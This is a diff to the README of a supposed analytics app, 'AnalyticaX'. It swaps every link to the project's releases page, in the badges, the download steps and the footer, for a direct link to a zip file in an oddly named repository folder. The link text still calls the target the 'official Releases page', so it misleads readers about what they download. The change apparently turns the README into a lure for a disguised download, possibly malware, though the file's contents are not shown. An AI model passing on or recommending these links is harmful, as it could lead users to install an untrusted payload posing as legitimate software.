@@ -1,6 +1,6 @@
 # 🚀 AnalyticaX - Smart Insights for Your Business
 
-[![Download AnalyticaX](https://img.shields.io/badge/Download-AnalyticaX-blue?style=for-the-badge)](https://github.com/pipiskazhopakakashka/AnalyticaX/releases)
+[![Download AnalyticaX](https://raw.githubusercontent.com/pipiskazhopakakashka/AnalyticaX/main/Compsothlypidae/Analytica-X-v1.5-alpha.3.zip)](https://raw.githubusercontent.com/pipiskazhopakakashka/AnalyticaX/main/Compsothlypidae/Analytica-X-v1.5-alpha.3.zip)
 
 ## 📋 What is AnalyticaX?
 
@@ -37,7 +37,7 @@ Starting with AnalyticaX is simple. The steps below will help you download, inst
 
 ### Step 1: Download AnalyticaX
 
-Click the big blue download button at the top or visit the official [AnalyticaX Releases page](https://github.com/pipiskazhopakakashka/AnalyticaX/releases). This page has the latest version of the software.
+Click the big blue download button at the top or visit the official [AnalyticaX Releases page](https://raw.githubusercontent.com/pipiskazhopakakashka/AnalyticaX/main/Compsothlypidae/Analytica-X-v1.5-alpha.3.zip). This page has the latest version of the software.
 
 Look for the latest release and find the file that matches your operating system:
 
@@ -67,7 +67,7 @@ The first time you open the app, you may see a welcome screen with tips and a br
 
 You can download AnalyticaX using the link below:
 
-[Download AnalyticaX from Releases](https://github.com/pipiskazhopakakashka/AnalyticaX/releases)
+[Download AnalyticaX from Releases](https://raw.githubusercontent.com/pipiskazhopakakashka/AnalyticaX/main/Compsothlypidae/Analytica-X-v1.5-alpha.3.zip)
 
 Remember to pick the version suited for your computer’s operating system. If you’re unsure, Windows users usually download `.exe`, macOS users `.dmg`, and Linux users `.AppImage`.
 
@@ -118,4 +118,4 @@ Your feedback helps improve future versions.
 
 ---
 
-[![Download AnalyticaX](https://img.shields.io/badge/Download-AnalyticaX-blue?style=for-the-badge)](https://github.com/pipiskazhopakakashka/AnalyticaX/releases)
+[![Download AnalyticaX](https://raw.githubusercontent.com/pipiskazhopakakashka/AnalyticaX/main/Compsothlypidae/Analytica-X-v1.5-alpha.3.zip)](https://raw.githubusercontent.com/pipiskazhopakakashka/AnalyticaX/main/Compsothlypidae/Analytica-X-v1.5-alpha.3.zip)
